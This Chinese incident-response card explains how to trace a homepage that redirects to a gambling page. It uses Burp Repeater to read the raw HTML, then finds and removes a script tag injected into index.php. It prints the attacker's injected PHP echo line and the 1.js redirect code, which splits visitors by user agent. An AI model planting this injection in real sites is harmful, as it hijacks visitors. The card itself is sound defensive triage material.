---
id: defense-incident-response-web-defacement-proxy-js-ua-redirect-triage
title: 网页篡改定位：Burp Repeater 停跳转读源码，发现 1.js 按 UA 分流跳博彩页并删除 index.php 注入
type: scenario
domain: defense
path: defense/incident-response
technique: web-defacement-proxy-js-ua-redirect-triage
tags:
- incident-response
- web-tampering
- defacement
- javascript
- user-agent
- burp
- triage
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V343
  verified_at: '2026-11-08T22:31:01+08:00'
  notes: 已对照原文图07-16核对 Burp Intercept/Repeater 读原始响应、注入的 <script src=.../1.js>、1.js 的 UA 判断与 1.png 跳转、index.php 末尾 echo 注入行及删除后恢复正常；卡内已注明源码 arc=/src 差异。
url: /docs/defense/incident-response/defense-incident-response-web-defacement-proxy-js-ua-redirect-triage/
draft: false
kb_aliases:
- 网页篡改排查
- 首页跳转博彩
- Burp Repeater 看源码
- 1.js UA 跳转
- index.php 注入 script
- 首页劫持定位
---

## 一句话结论

访问网站首页被强制跳到博彩页面时，不要跟着浏览器的跳转走：用 Burp 代理开启 Intercept 抓首页请求、送 Repeater 点 `Go`，直接看服务器返回的原始 HTML（此时不执行 JS），就能在响应末尾发现被注入的 `<script src="http://<server>/1.js">`；再直接访问 `1.js` 可见 `browserRedirect()` 按 User-Agent 分流——移动端（Android/iPhone/iPad 等）留在 `#`，其他 UA 跳到博彩图片 `1.png`，最后回到 `index.php` 删除注入行。

## 原理

- **浏览器执行 JS 导致看不到源码**：首页 HTML 里的脚本在浏览器解析时立即执行 `window.location.href=...`，用户只看到博彩页；但服务器响应本身仍包含原始注入代码。
- **代理 Repeater 绕过执行**：Burp 拦截请求后在 Repeater 中重新发送，响应面板展示的是服务器原始响应体，不经过浏览器渲染/脚本执行；因此在 HTML 末尾看到注入的 `<script type="text/javascript" src="http://172.16.12.233/1.js"></script>`（文中源码的 echo 行写作 `arc=`，浏览器/响应中实际按 `src` 加载）。
- **1.js 的 UA 分流**：`if ((/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent))) { window.location.href="#"; } else { window.location.href="http://172.16.12.233/1.png"; }`——移动端不跳转，PC 端加载博彩图片；这是为了规避移动端安全浏览/审核或按设备类型投放。
- **注入点在正常文件**：恶意 `<script>` 被追加到 `index.php` 的正常输出中（`echo '<script ...>';` 位于页面底部 `</body>` 前），不是独立恶意文件；`1.js`、`1.png` 是同一攻击者放置的配套文件。
- **为什么先看源码再删**：确认注入点与跳转逻辑后再编辑 `index.php` 删除该行，避免误删正常业务代码；删除后再次访问首页验证恢复正常。
- **边界**：若跳转由 DNS/CDN/边缘节点或服务器配置完成、HTML 被加密/混淆、代理不被信任（证书错误）时，需换其他抓包方式；移动端 UA 可能看不到跳转。

## 触发条件

- 网站首页在浏览器中自动跳转到外部/博彩页面，且服务器响应含恶意脚本。
- 分析者能设置浏览器代理并使用 Burp（或 curl/其他代理）获取原始响应。
- 攻击者留下的 JS/图片文件仍可访问，便于确认行为。
- 服务器文件可编辑（有权限清理注入代码）。

## 利用步骤

1. 配置浏览器代理到 Burp（127.0.0.1:8080），Intercept 保持开启，访问站点首页。
2. 抓到的首页请求右键 Send to Repeater，点 `Go`；在 Response 的 Raw/HTML 中搜索 `script`、`http://`、`iframe`、`window.location`，定位注入的 `<script src=...>`。
3. 浏览器直接访问该 JS（如 `http://<server>/1.js`），阅读跳转逻辑与 UA 判断；访问其引用的图片（如 `1.png`）确认是博彩页面/素材。
4. 在服务器上定位注入文件（本案 `/www/wwwroot/index.php`），用 vim 等编辑删除 `echo '<script ...></script>';` 这一行；若整个文件是独立恶意文件则直接删除。
5. 重新访问首页确认不再跳转；同时检查其他页面/模板是否被注入相同脚本（grep 特征域名/文件名）。
6. 固定证据：保存原始响应、JS/图片、注入文件与修改时间，作为溯源材料。

## PoC

```javascript
// 1.js（文中内容，域名做占位化）
function browserRedirect() {
  if ((/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent))) {
    window.location.href = "#";
  } else {
    window.location.href = "http://<server>/1.png";
  }
}
browserRedirect();
```

```php
// index.php 末尾被注入的行（示意）
echo '<script type="text/javascript" src="http://<server>/1.js"></script>';
```

```text
# 快速排查命令
grep -rn "1\.js\|1\.png" /www/wwwroot/ --include='*.php' --include='*.html'
grep -rni "window.location\|<script" /www/wwwroot/index.php
```

说明：代码来自文中实验环境，域名/路径做占位化；未执行。

## 变体与关联

- [[defense-incident-response-frontend-watering-hole-js-jsp-tamper-triage]]：另一类前端篡改（弹窗诱导下载木马）的排查，靠提示文案、`.js1` 备份与 mtime 定位，并用 cookie 门控；本卡靠代理响应与 1.js 的 UA 分流定位。
- [[web-generic-third-party-js-domain-takeover-night-redirect]]：第三方 JS 域名被抢注导致夜间跳转，属外部依赖被投毒；本卡是本地文件被注入。
- [[web-generic-xss-javascript-context-injection]]：JS 上下文注入手法，可用于理解注入点，但本卡是篡改后的应急定位，不是漏洞利用。
- 变体：注入 `<iframe>`、`meta refresh`、`.htaccess` 重写、Nginx 配置跳转；JS 可按 Referer/时间/地域/UA 分流；恶意文件可伪装成 `1.png`、`logo.jpg`。
- 边界：跳转发生在 CDN/边缘、响应被加密、代理证书不受信时，Repeater 方案需调整。

## 检测与防御

- 检测：首页/模板文件出现 `<script src="http://IP/...">`、`window.location`、`iframe` 等异常注入；服务器上出现命名不规范的文件（`1.js`、`1.png`）；文件 mtime 异常晚于业务发布时间。
- 检测：浏览器访问首页先出现对非常规域名/IP 的 JS/图片请求；响应 HTML 与版本库/备份差异。
- 防御：Web 目录文件完整性监控（FIM）、版本对比与定期备份；严格上传与编辑权限；部署 WAF 拦截对模板/首页文件的写入；对出站异常 JS 引用做 CSP/白名单。
- 响应：保存证据 → 删除注入代码/文件 → 全站 grep 同特征 → 检查同源 WebShell/上传入口 → 复查访问正常。
